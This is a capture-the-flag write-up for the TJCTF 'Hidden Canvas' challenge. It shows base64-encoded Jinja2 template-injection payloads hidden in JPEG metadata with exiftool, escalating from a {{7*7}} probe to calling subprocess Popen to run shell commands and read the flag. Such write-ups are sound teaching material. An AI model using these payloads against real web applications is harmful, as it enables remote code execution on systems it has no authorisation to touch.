## Hidden Canvas

---

### Challenge

I made this site where you can upload profile pictures, if you happen to embed caption metadata within your image, I'll try displaying it on your profile page.

[https://instancer.tjctf.org/challenge/hidden-canvas](https://instancer.tjctf.org/challenge/hidden-canvas)

---

### Solution

I downloaded a sample `Untitled.jpeg` from online to embed my metadata using `exiftool`.

```
exiftool -ImageDescription="Hello" Untitled.jpeg
```

![image](https://github.com/user-attachments/assets/47065ce5-4bce-4292-a9df-e1235bc25fec)

The error urged me to convert the Image Description into `base64` format. This was the result afterwards.

```
exiftool -ImageDescription="aGVsbG8=" Untitled.jpeg  
```

![image](https://github.com/user-attachments/assets/5c275fa7-4f64-4aff-96d5-78d865fda741)

Next, I thought of trying SSTI payloads to test whether or not it is vulenrable.

```
exiftool -ImageDescription="e3s3Kjd9fQ==" Untitled.jpeg

#{{7*7}}                                                                                        
```

![image](https://github.com/user-attachments/assets/e8c36b57-e222-410c-9248-02eb278651c5)

The output confirms that it is vulnerable to SSTI attacks. So I tried listing the contents of the directory:

![image](https://github.com/user-attachments/assets/7aa08016-66ec-4bac-8656-ed9f5c32dcda)

What we need to do is read `/flag.txt`. For that we have to check whether we have the necessary subclasses that allow reading the contents of the file.

```
exiftool -ImageDescription="e3sgJycuX19jbGFzc19fLl9fbXJvX19bMV0uX19zdWJjbGFzc2VzX18oKSB9fQo=" Untitled.jpeg

#{{ ''.__class__.__mro__[1].__subclasses__() }}

```

From the list we find that we have the subprocess `Popen` but we don't know its index location. To find the index, we craft the payload a bit differently.

```
exiftool -ImageDescription="eyUgZm9yIGMgaW4gJycuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0KICB7eyBsb29wLmluZGV4MCB9fSAtIHt7IGN8c3RyaW5nIH19PGJyPgp7JSBlbmRmb3IgJX0=" Untitled.jpeg

#{% for c in ''.__class__.__base__.__subclasses__() %}
# {{ loop.index0 }} - {{ c|string }}<br>
#{% endfor %}
```

![image](https://github.com/user-attachments/assets/92f28ea8-8d09-4962-b0d4-06c27d55ed44)

From this we find that `Popen` has the index of `353`. Now we can call it to print the contents of `/flag.txt`

```
exiftool -ImageDescription='e3sgJycuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKClbMzUzXSgnY2F0IGZsYWcudHh0Jywgc2hlbGw9VHJ1ZSwgc3Rkb3V0PS0xKS5jb21tdW5pY2F0ZSgpWzBdLmRlY29kZSgpIH19Cg==' Untitled.jpeg

# cat flag.txt
```

![image](https://github.com/user-attachments/assets/197df6d5-b3a4-49a4-a66a-d16faeffd8a2)

---

### Flag

`tjctf{H1dd3n_C@nv@s_D3c0d3d_4nd_R3nd3r3d!}`
